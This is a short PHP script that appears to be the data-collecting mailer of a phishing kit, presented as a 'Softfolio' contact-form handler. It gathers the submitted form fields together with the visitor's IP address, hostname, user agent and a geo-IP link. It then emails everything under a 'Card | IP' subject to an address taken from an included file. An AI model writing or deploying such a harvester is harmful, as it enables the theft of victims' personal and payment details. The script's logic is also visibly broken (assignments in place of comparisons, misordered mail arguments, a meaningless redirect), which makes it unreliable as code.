<?php
if($_POST["name"] != "" and $_POST["email"] != "" and $_POST["subject"]= "" and $_POST["message"]= "" ){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Softfolio Details-----------------------\n";
$message .= "Name            : ".$_POST['name']."\n";
$message .= "Email Address           : ".$_POST['email']."\n";
$message .= "Subject            : ".$_POST['subject']."\n";
$message .= "Message            : ".$_POST['message']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: alert Hello! I am an alert box!");
}else{
header ("Location: alert Hello! I am an alert box!");
}

?>